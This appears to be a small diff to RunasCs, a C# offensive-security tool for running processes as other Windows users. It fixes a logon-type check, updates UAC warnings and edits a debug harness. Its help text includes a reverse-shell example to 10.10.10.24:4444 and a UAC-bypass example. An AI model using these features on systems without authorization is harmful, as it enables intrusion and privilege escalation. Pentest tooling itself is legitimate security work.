@@ -478,7 +478,7 @@ public class RunasCs
         startupInfo.lpDesktop = desktopName;
 
         if(createProcessFunction == 2){
-            if (logonType != LOGON32_LOGON_INTERACTIVE || logonType != LOGON32_LOGON_NEW_CREDENTIALS) {
+            if (logonType != LOGON32_LOGON_INTERACTIVE && logonType != LOGON32_LOGON_NEW_CREDENTIALS) {
                 Console.Out.WriteLine("[*] Warning: Using function CreateProcessWithLogonW is not compatible with logon type " + logonType.ToString() + ". Reverting to logon type Interactive (2)...");
                 Console.Out.Flush();
             }
@@ -501,7 +501,7 @@ public class RunasCs
                             throw new RunasCsException("CreateProcessWithLogonWUacBypass failed with " + Marshal.GetLastWin32Error());
                     }
                     else {
-                        Console.Out.WriteLine(String.Format("[*] Warning: Token retrieved for user '{0}' is limited by UAC. Use the flag -b to try a UAC bypass or use the Network (3) in --logon-type.", username));
+                        Console.Out.WriteLine(String.Format("[*] Warning: Token retrieved for user '{0}' is limited by UAC. Use the flag -b to try a UAC bypass or use the NetworkCleartext (8) in --logon-type.", username));
                         Console.Out.Flush();
                         success = CreateProcessWithLogonW(username, domainName, password, (UInt32)logonFlags, processPath, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
                         if (success == false)
@@ -544,7 +544,7 @@ public class RunasCs
                 }
                 else
                 {
-                    Console.Out.WriteLine(String.Format("[*] Warning: Token retrieved for user '{0}' is limited by UAC. Use the flag -b to try a UAC bypass or use the Network (3) in --logon-type.", username));
+                    Console.Out.WriteLine(String.Format("[*] Warning: Token retrieved for user '{0}' is limited by UAC. Use the flag -b to try a UAC bypass or use the NetworkCleartext (8) in --logon-type.", username));
                     Console.Out.Flush();
                 }
             }
@@ -1584,7 +1584,7 @@ Examples:
         RunasCs.exe user1 password1 cmd.exe -r 10.10.10.24:4444
     Run a command simulating the /netonly flag of runas.exe 
         RunasCs.exe user1 password1 whoami -d domain -l 9
-	Run a command as an Administrator bypassing UAC
+    Run a command as an Administrator bypassing UAC
         RunasCs.exe adm1 password1 ""whoami /all"" --bypass-uac
 ";
     
@@ -1813,14 +1813,12 @@ class MainClass
         string[] argsTest = new string[10];
         argsTest[0] = "admin";
         argsTest[1] = "pwd";
-        argsTest[2] = "whoami /all";
+        argsTest[2] = "cmd.exe";
         //argsTest[2] = "ping -n 30 127.0.0.1";
         argsTest[3] = "--function";
-        argsTest[4] = "1";
+        argsTest[4] = "2";
         argsTest[5] = "--logon-type";
-        argsTest[6] = "4";
-        //argsTest[7] = "--bypass-uac";
-
+        argsTest[6] = "2";
         Console.Out.Write(RunasCsMainClass.RunasCsMain(argsTest));
     }
 }
